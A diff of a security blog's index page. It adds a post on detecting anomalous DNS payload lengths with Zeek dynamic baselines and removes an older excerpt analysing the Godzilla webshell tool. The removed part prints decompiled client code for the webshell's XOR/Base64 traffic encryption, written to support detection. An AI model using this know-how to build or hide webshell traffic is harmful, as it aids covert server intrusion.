@@ -157,7 +157,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">34</span>
+          <span class="site-state-item-count">35</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -199,6 +199,151 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/10/Zeek-Detect-Suspicious-DNS-traffic/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Canon">
+      <meta itemprop="description" content="一个热爱健身的安全分析师">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Canon's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/08/10/Zeek-Detect-Suspicious-DNS-traffic/" class="post-title-link" itemprop="url">How to use Zeek Detect Suspicious DNS traffic</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-08-10 14:41:21" itemprop="dateCreated datePublished" datetime="2024-08-10T14:41:21+08:00">2024-08-10</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2024-08-16 16:08:50" itemprop="dateModified" datetime="2024-08-16T16:08:50+08:00">2024-08-16</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/NTA/" itemprop="url" rel="index"><span itemprop="name">NTA</span></a>
+        </span>
+    </span>
+
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>5.3k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>5 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h4 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h4><p>​    我嘞个去！小不在意都已经到了2024的下半年了，近期花了一些时间研究了DNS异常流量的检测模型。老样子依旧是放在Zeek上来实现，Zeek作为网络流量的“瑞士军刀”可玩性还是很大的。由于现在写Blog时间太少了，这里将会通过分期的形式进行更新。</p>
+<p>​    本期主题是：如何通过 Zeek <a target="_blank" rel="noopener" href="https://docs.zeek.org/en/master/frameworks/sumstats.html#summary-statistics">Summary Statistics</a> 实现<strong>动态基线</strong>，检测 DNS Payload 请求长度上的异常。</p>
+<h4 id="检测维度"><a href="#检测维度" class="headerlink" title="检测维度"></a>检测维度</h4><h5 id="1-请求包长度异常"><a href="#1-请求包长度异常" class="headerlink" title="1. 请求包长度异常"></a>1. 请求包长度异常</h5><p>​    通常最简单粗暴的方式就是通过手动指定一个<strong>『长度』</strong>作为告警阈值。但是难点就是<strong>『长度』</strong>设置为多少才算合适？长度设置较小，告警量多，误报率就会增加。长度设置较大，告警量少，但不一定会有告警。所以最好的方式就是能够动态计算一段时间内的<strong>『长度』</strong>作为阈值，以这个为基线去计算标准差和平均值再进行比对。</p>
+<ul>
+<li><p>定义一个动态基线时间窗口</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Global variable <span class="keyword">for</span> baseline interval</span><br><span class="line"><span class="keyword">const</span> baseline_interval: interval = <span class="number">300</span>sec &amp;redef; # Baseline interval <span class="keyword">for</span> SumStats collection</span><br></pre></td></tr></table></figure></li>
+<li><p>由于DNS在不同的请求类型下Payload长度也会有明显的差异，所以为了避免这类“干扰项”我们将按照DNS请求类型进行聚合来计算动态基线</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> &#123;</span><br><span class="line">    # Define a record type to store the average <span class="keyword">and</span> standard deviation</span><br><span class="line">    type Stats: record &#123;</span><br><span class="line">        prev_avg: count; # Previous average payload size</span><br><span class="line">        prev_sd: count;  # Previous standard deviation of payload size</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    # Define a table to store the data</span><br><span class="line">    option data: table[string] of Stats;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>考虑到实际环境中DNS的请求数量会非常的多，我们也需要考虑代码在上线后对集群负载带来的影响。所以，这里将会通过<code>local_domain</code>、<code>ignore_qtypes</code>、<code>ignore_querys</code>、<code>ignore_subdomains</code>、<code>ignore_domains</code>、<code>ignore_tlds</code>等多个条件进行控制。</p>
+<ul>
+<li><strong>local_domian</strong>：代表实际环境中的内部域名，这些域名通常用于企业内网或者内部业务系统之间的通讯和API调用。通常这些域名不需要被列入到动态基线的计算范围内，因为它们在多数情况下都是在内部网络环境中使用，而非公开互联网访问。这有助于减少不必要的噪音和误报，提高基线计算的准确性。</li>
+<li><strong>ignore_qtypes</strong>：代表你需要忽略的DNS请求类型。</li>
+<li><strong>ignore_querys</strong>：代表你需要忽略的完整DNS请求。如：<code>canon88.github.io</code> 就是一个完整的域名请求</li>
+<li><strong>ignore_subdomains</strong>：代表你需要忽略的子域名。例如：在 <code>canon88.github.io</code> 中，<code>canon88</code> 就是子域名</li>
+<li><strong>ignore_domains</strong>：代表你需要忽略的主域名或二级域名。例如：在 <code>canon88.github.io</code> 中，<code>github.io</code> 是主域</li>
+<li><strong>ignore_tlds</strong>：代表你需要忽略的顶级域名（TLD）。例如：在 <code>canon88.github.io</code> 中，<code>io</code> 就是顶级域名。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">event dns_message(c: connection, is_orig: bool, msg: dns_msg, len: count) &amp;priority=-10 &#123; </span><br><span class="line">		# Return early if the domain is local</span><br><span class="line">    if (c$dns$is_local_domain)</span><br><span class="line">        return;</span><br><span class="line">  </span><br><span class="line">    # Filter out queries of types that should be ignored</span><br><span class="line">    if (c$dns$qtype_name in SuspiciousDNSTraffic::ignore_qtypes)</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    # Ignore trusted queries</span><br><span class="line">    if (c$dns$query in SuspiciousDNSTraffic::ignore_querys)</span><br><span class="line">        return;</span><br><span class="line">    </span><br><span class="line">    #  Ignore trusted subdomains</span><br><span class="line">    if ( (c$dns?$subdomain) &amp;&amp; (c$dns$subdomain in SuspiciousDNSTraffic::ignore_subdomains) )</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    # Ignore trusted domains</span><br><span class="line">    if ( (c$dns?$domain) &amp;&amp; (c$dns$domain in SuspiciousDNSTraffic::ignore_domains) )</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    # Ignore trusted top-level domains</span><br><span class="line">    if ( (c$dns?$tld) &amp;&amp; ( (c$dns$tld in SuspiciousDNSTraffic::ignore_tlds) || (SuspiciousDNSTraffic::ignore_tlds_regex in c$dns$tld) ) )</span><br><span class="line">        return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>下面开始进入“正题”，通过Zeek <a target="_blank" rel="noopener" href="https://docs.zeek.org/en/master/frameworks/sumstats.html#summary-statistics">Summary Statistics</a> 进行 DNS Payload 动态基线的计算。</p>
+<ul>
+<li><p><strong>计算基线数据</strong>：使用 <code>SumStats</code> 模块每隔 <code>baseline_interval</code>（300秒） 计算一次 DNS 负载大小的平均值和标准差，并将这些数据存储在 <code>data</code> 表中。</p>
+</li>
+<li><p><strong>比对当前负载大小</strong>：在处理每个 DNS 消息时，当前负载大小（<code>len</code>）会与数据表中的先前平均值（<code>prev_avg</code>）和标准差（<code>prev_sd</code>）进行比对。</p>
+</li>
+<li><p><strong>比对阈值计算</strong>：</p>
+<ul>
+<li><p>最大平均值阈值：<code>avg * multiplier_threshold</code></p>
+</li>
+<li><p>最小平均值阈值：<code>avg / multiplier_threshold</code></p>
+</li>
+<li><p>最大标准差阈值：<code>avg + sd * deviation_threshold</code></p>
+</li>
+<li><p>最小标准差阈值：<code>avg - sd * deviation_threshold</code></p>
+</li>
+</ul>
+</li>
+<li><p><strong>确定可疑负载</strong>：</p>
+<ul>
+<li><p>如果当前负载大小超过最大平均值阈值或小于最小平均值阈值，则标记为可疑。</p>
+</li>
+<li><p>如果当前负载大小超过最大标准差阈值或小于最小标准差阈值，则标记为可疑。</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"># Event handler for DNS messages</span><br><span class="line">event dns_message(c: connection, is_orig: bool, msg: dns_msg, len: count) &amp;priority=-10 &#123;</span><br><span class="line">    # Store the payload size in the DNS::Info record</span><br><span class="line">    c$dns$payload_len = len;</span><br><span class="line"></span><br><span class="line">    # Observe the payload size for SumStats calculations</span><br><span class="line">    SumStats::observe(&quot;dns_payload_len&quot;, SumStats::Key($str=c$dns$qtype_name), SumStats::Observation($num=len));</span><br><span class="line"></span><br><span class="line">    if (c$dns$qtype_name in data) &#123;</span><br><span class="line">        local avg = data[c$dns$qtype_name]$prev_avg;</span><br><span class="line">        local sd = data[c$dns$qtype_name]$prev_sd;</span><br><span class="line"></span><br><span class="line">        local max_avg_threshold = avg * SuspiciousDNSTraffic::multiplier_threshold;</span><br><span class="line">        local min_avg_threshold = avg / SuspiciousDNSTraffic::multiplier_threshold;</span><br><span class="line">        local max_sd_threshold = avg + sd * SuspiciousDNSTraffic::deviation_threshold;</span><br><span class="line">        local min_sd_threshold = avg - sd * SuspiciousDNSTraffic::deviation_threshold;</span><br><span class="line"></span><br><span class="line">        # Compare the current payload size with the calculated average and standard deviation</span><br><span class="line">        if ( avg != 0.0 ) &#123;</span><br><span class="line">            local alert_reason: set[string] = set();</span><br><span class="line">            if ( len &gt; max_avg_threshold ) &#123;</span><br><span class="line">                c$dns$is_oversize_payload = T;</span><br><span class="line">                c$dns$avg_threshold = max_avg_threshold;</span><br><span class="line">                add alert_reason[&quot;payload_len &gt; avg_threshold&quot;];</span><br><span class="line">            &#125; else if ( len &lt; min_avg_threshold ) &#123;</span><br><span class="line">                c$dns$is_oversize_payload = T;</span><br><span class="line">                c$dns$avg_threshold = min_avg_threshold;</span><br><span class="line">                add alert_reason[&quot;payload_len &lt; avg_threshold&quot;];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if ( len &gt; max_sd_threshold ) &#123;</span><br><span class="line">                c$dns$is_oversize_payload = T;</span><br><span class="line">                c$dns$sd_threshold = max_sd_threshold;</span><br><span class="line">                add alert_reason[&quot;payload_len &gt; sd_threshold&quot;];</span><br><span class="line">            &#125; else if ( len &lt; min_sd_threshold ) &#123;</span><br><span class="line">                c$dns$is_oversize_payload = T;</span><br><span class="line">                c$dns$sd_threshold = min_sd_threshold;</span><br><span class="line">                add alert_reason[&quot;payload_len &lt; sd_threshold&quot;];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if ( |alert_reason| &gt; 0 ) &#123;</span><br><span class="line">                c$dns$alert_reason = alert_reason;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # c$dns$payload_prev_avg = avg;</span><br><span class="line">        # c$dns$payload_prev_sd = sd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Initialize the event handler for analyzing DNS requests</span><br><span class="line">event zeek_init() &#123;</span><br><span class="line">    # Define a reducer to calculate the standard deviation of DNS payload sizes</span><br><span class="line">    local r_std_dev = SumStats::Reducer($stream=&quot;dns_payload_len&quot;, $apply=set(SumStats::STD_DEV));</span><br><span class="line"></span><br><span class="line">    # Create a SumStats object to collect data every baseline_interval (e.g. 5 minutes)</span><br><span class="line">    SumStats::create([</span><br><span class="line">        $name = &quot;dns_payload_len.std_dev&quot;,</span><br><span class="line">        $epoch = baseline_interval,</span><br><span class="line">        $reducers = set(r_std_dev),</span><br><span class="line">        $epoch_result(ts: time, key: SumStats::Key, result: SumStats::Result) = &#123; </span><br><span class="line">            local current_avg = double_to_count(result[&quot;dns_payload_len&quot;]$average);</span><br><span class="line">            local current_std_dev = double_to_count(result[&quot;dns_payload_len&quot;]$std_dev);</span><br><span class="line"></span><br><span class="line">            # Initialize the table with the given data</span><br><span class="line">            data[key$str] = [$prev_avg = current_avg, $prev_sd = current_std_dev];</span><br><span class="line"></span><br><span class="line">            # Update the data table with the new values</span><br><span class="line">            Config::set_value(&quot;SuspiciousDNSTraffic::data&quot;, data);</span><br><span class="line">        &#125;</span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.vjshi.com/2021-12-23/33ac8590ed1844d5bf0251349ea6da19/online/main.jpg?x-oss-process=style/video_cover_20231101" alt="未完待续视频素材下载, 未完待续AE模板下载_光厂(VJ师网)"></p>
+<h5 id="2-请求域名长度异常"><a href="#2-请求域名长度异常" class="headerlink" title="2. 请求域名长度异常"></a>2. 请求域名长度异常</h5><h5 id="3-非常见域名监控"><a href="#3-非常见域名监控" class="headerlink" title="3. 非常见域名监控"></a>3. 非常见域名监控</h5><h5 id="4-Fast-Flux"><a href="#4-Fast-Flux" class="headerlink" title="4. Fast Flux"></a>4. Fast Flux</h5><h5 id="5-非常见请求类型"><a href="#5-非常见请求类型" class="headerlink" title="5. 非常见请求类型"></a>5. 非常见请求类型</h5><h5 id="6-域名信誉度"><a href="#6-域名信誉度" class="headerlink" title="6. 域名信誉度"></a>6. 域名信誉度</h5>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1870,255 +2015,6 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/30/Zeek-Detect-Godzilla-WebShell/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Canon">
-      <meta itemprop="description" content="一个热爱健身的安全分析师">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Canon's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/11/30/Zeek-Detect-Godzilla-WebShell/" class="post-title-link" itemprop="url">Zeek - Detect Godzilla WebShell</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-11-30 15:45:58" itemprop="dateCreated datePublished" datetime="2021-11-30T15:45:58+08:00">2021-11-30</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2023-06-21 00:47:42" itemprop="dateModified" datetime="2023-06-21T00:47:42+08:00">2023-06-21</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/NTA/" itemprop="url" rel="index"><span itemprop="name">NTA</span></a>
-        </span>
-    </span>
-
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>13k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>12 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p><strong>Godzilla（哥斯拉）：</strong></p>
-<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Godzilla.png" alt="image-20211211235918877"></p>
-<p>​    身高：50米</p>
-<p>​    体重：2万吨</p>
-<p>​    攻击方式：放射热线、白热光、袋鼠踢、投掷、搏击、尾鞭</p>
-<p>​    一种生活在侏罗纪和白垩纪之间的罕见海栖爬虫类和陆生兽类的中间形态生物的残存个体，因氢弹试验的影响而出现。最初在太平洋上出现并袭击货船，后经大户岛在东京登陆，造成巨大破坏。最终在东京湾被芹泽博士发明的水中氧气破坏素（核能氧气素/氧气破坏者）杀死。</p>
-<p>​    以下文章将简述如何捕获该怪兽，首先派大量直升机去恶魔岛劫持另一体型巨大但温和许多的巨兽：金刚。然后让金刚抗伤害人类偷袭就好。<strong>本篇完！</strong></p>
-<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Kong.webp" alt="image-20211211235918877"></p>
-<p><strong>实在编不下去了，来点正经的吧。。。</strong></p>
-<hr>
-<p><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/Godzilla"><strong>Godzilla</strong></a>（哥斯拉）是一款优秀的WebShell权限管理工具，其特点有：</p>
-<ul>
-<li><p>哥斯拉全部类型的Shell均过市面所有静态查杀</p>
-</li>
-<li><p>哥斯拉流量加密过市面全部流量WAF</p>
-</li>
-<li><p>哥斯拉的自带的插件是冰蝎、蚁剑不能比拟的</p>
-</li>
-</ul>
-<p><strong><a target="_blank" rel="noopener" href="https://github.com/zeek/zeek">Zeek</a></strong> （原名：Bro） 是一个开源的网络流量分析器。许多运营商将Zeek作为网络安全监控器（NSM），支持对可疑或恶意活动的调查。Zeek还支持安全领域以外的广泛的流量分析任务，包括性能测量和故障排除。其特点有：</p>
-<ul>
-<li><p>深度分析：Zeek带有许多协议的分析器，可以在应用层进行高级语义分析。</p>
-</li>
-<li><p>适应性和灵活性：Zeek的特定领域脚本语言可以实现特定地点的监控策略，这意味着它不受限于任何特定的检测方法。</p>
-</li>
-<li><p>高效：Zeek以高性能网络为目标，在各种大型网站上运行。</p>
-</li>
-<li><p>高度的状态性：Zeek对其监控的网络保持广泛的应用层状态，并提供网络活动的高级档案。</p>
-</li>
-</ul>
-<p><strong>环境</strong></p>
-<ul>
-<li>Godzilla： v4.0.1</li>
-<li>Zeek：v4.1.0</li>
-<li>WebShell：<ul>
-<li>PHP XOR BASE64</li>
-<li>JSP AES BASE64</li>
-</ul>
-</li>
-</ul>
-<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><h2 id="PHP-XOR-BASE64"><a href="#PHP-XOR-BASE64" class="headerlink" title="PHP XOR BASE64"></a>PHP XOR BASE64</h2><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><ul>
-<li>基础配置：URL、密码、密钥、加密器等信息。如下图所示：<ul>
-<li>密码：和蚁剑、菜刀一样，密码就是POST请求中的参数名称。例如，在本例中密码为<code>Happy</code>，那么Godzilla提交的每个请求都是<code>Happy=XXX</code>这种形式。以下称为<strong>pass</strong></li>
-<li>密钥：用于对请求数据进行加密，不过加密过程中并非直接使用密钥明文，而是计算密钥的MD5值，然后取其前16位用于加密。以下为称为<strong>key</strong></li>
-<li>有效载荷：生成对应类型的WebShell</li>
-<li>加密器：控制WebShell的加密方式</li>
-<li>请求配置：主要用于自定义HTTP请求头，以及在最终的请求数据前后额外再追加一些扰乱数据，进一步降低流量的特征</li>
-</ul>
-</li>
-</ul>
-<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/%E5%AE%A2%E6%88%B7%E7%AB%AF.png" alt="image-20211130173607606"></p>
-<ul>
-<li><p>由于Godzilla的源码作者并未做混淆，所以通过<a target="_blank" rel="noopener" href="https://github.com/skylot/jadx"><strong>jadx</strong></a>工具很方便就能得到源码。</p>
-<p>对于<strong>PHP XOR BASE64</strong>加密方式来说，首位各附加了<strong>16位</strong>的校验字符串（<strong>pass</strong> + <strong>key</strong> 计算的<strong>MD5</strong>值）。</p>
-</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PhpXor</span> <span class="keyword">implements</span> <span class="title">Cryption</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ShellEntity context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.shell = context;</span><br><span class="line">        <span class="keyword">this</span>.http = <span class="keyword">this</span>.shell.getHttp();</span><br><span class="line">        <span class="keyword">this</span>.key = <span class="keyword">this</span>.shell.getSecretKeyX().getBytes();</span><br><span class="line">        <span class="keyword">this</span>.pass = <span class="keyword">this</span>.shell.getPassword();</span><br><span class="line">        String findStrMd5 = functions.md5(<span class="keyword">this</span>.pass + <span class="keyword">new</span> String(<span class="keyword">this</span>.key));	<span class="comment">// 校验字符串</span></span><br><span class="line">        <span class="keyword">this</span>.findStrLeft = findStrMd5.substring(<span class="number">0</span>, <span class="number">16</span>);												<span class="comment">// 前16位MD5</span></span><br><span class="line">        <span class="keyword">this</span>.findStrRight = findStrMd5.substring(<span class="number">16</span>);													<span class="comment">// 后16位MD5</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>请求加密<ul>
-<li>对于明文数据使用<strong>key</strong>进行按位异或-&gt;base64编码-&gt;url编码，实现数据加密；</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">byte</span>[] encode(<span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> E(data);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">          Log.error(e);</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过key按位异或</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">byte</span>[] E(<span class="keyword">byte</span>[] cs) &#123;</span><br><span class="line">      <span class="keyword">int</span> len = cs.length;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">          cs[i] = (<span class="keyword">byte</span>) (cs[i] ^ <span class="keyword">this</span>.key[(i + <span class="number">1</span>) &amp; <span class="number">15</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">this</span>.pass + <span class="string">&quot;=&quot;</span> + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>响应解密</p>
-<ul>
-<li><p>首先调用<code>findStr</code>方法删除响应数据中的前后16位校验字符串；</p>
-</li>
-<li><p>然后利用<code>base64Decode</code>方法解码字符串；</p>
-</li>
-<li><p>最后使用<strong>key</strong>按位异或，实现数据解密；</p>
-</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] decode(<span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data == <span class="keyword">null</span> || data.length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> D(findStr(data));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] D(String data) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] cs = functions.base64Decode(data);</span><br><span class="line">    <span class="keyword">int</span> len = cs.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        cs[i] = (<span class="keyword">byte</span>) (cs[i] ^ <span class="keyword">this</span>.key[(i + <span class="number">1</span>) &amp; <span class="number">15</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cs;</span><br><span class="line">&#125;</span><br><span class="line">		</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">findStr</span><span class="params">(<span class="keyword">byte</span>[] respResult)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> functions.subMiddleStr(<span class="keyword">new</span> String(respResult), <span class="keyword">this</span>.findStrLeft, <span class="keyword">this</span>.findStrRight);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>演示数据 - 数据解密</strong></p>
-<p>![image-20211201143236656](./Zeek-Detect-Godzilla-WebShell/示例数据 - 1.png)</p>
